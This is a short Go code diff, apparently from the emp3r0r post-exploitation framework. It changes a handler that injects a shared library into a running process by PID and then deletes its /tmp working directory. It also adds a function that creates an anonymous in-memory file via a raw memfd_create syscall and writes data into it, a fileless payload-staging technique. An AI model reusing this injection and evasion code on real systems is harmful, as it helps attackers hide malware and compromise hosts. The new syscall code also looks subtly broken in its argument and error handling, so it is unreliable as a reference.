@@ -15,6 +15,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"unsafe"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -379,12 +380,27 @@ func InjectorHandler(pid int, method string) (err error) {
 		err = InjectSO(pid)
 		if err == nil {
 			err = os.RemoveAll("/tmp/emp3r0r")
-			if err != nil {
-				return
-			}
 		}
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
 	return
+}
+
+// MemFDWrite create a memfd and write data to it
+// returns the fd
+func MemFDWrite(data []byte) int {
+	mem_name := ""
+	const memfdCreateX64 = 319
+	fd, _, errno := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&mem_name)), uintptr(0), 0)
+	if errno < 0 {
+		log.Printf("MemFDWrite: %v", errno)
+		return -1
+	}
+	_, err := syscall.Write(int(fd), data)
+	if err != nil {
+		log.Printf("MemFDWrite: %v", err)
+		return -1
+	}
+	return int(fd)
 }
